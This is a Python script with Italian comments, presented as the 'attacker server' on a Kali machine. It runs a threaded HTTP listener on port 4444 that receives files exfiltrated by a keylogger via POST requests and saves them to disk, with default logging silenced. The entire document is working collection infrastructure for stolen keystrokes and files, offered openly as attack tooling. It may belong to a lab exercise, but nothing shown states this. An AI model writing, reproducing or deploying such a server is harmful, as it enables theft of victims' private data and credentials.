#!/usr/bin/env python3
# ============================================================
#  SERVER ATTACCANTE (macchina Kali "attaccante")
#  Raccoglie i file esfiltrati dal keylogger via HTTP POST.
#  Uso:  python3 server_attaccante.py
# ============================================================
import http.server, socketserver, os, datetime

PORT     = 4444
SAVE_DIR = "ricevuti"

os.makedirs(SAVE_DIR, exist_ok=True)

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data   = self.rfile.read(length)
        fname  = os.path.basename(self.headers.get(
                     "X-Filename", f"dump_{datetime.datetime.now():%Y%m%d_%H%M%S}.bin"))
        # anti path traversal: basename + solo dentro SAVE_DIR
        path = os.path.join(SAVE_DIR, fname)
        with open(path, "wb") as f:
            f.write(data)
        print(f"[+] Ricevuto: {fname} ({len(data)} byte) da {self.client_address[0]}")
        self.send_response(200); self.end_headers(); self.wfile.write(b"OK")

    def log_message(self, *a):  # silenzia i log HTTP di default
        pass

class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True

if __name__ == "__main__":
    with Server(("0.0.0.0", PORT), Handler) as srv:
        print(f"[*] In ascolto su 0.0.0.0:{PORT} - file salvati in ./{SAVE_DIR}/")
        srv.serve_forever()
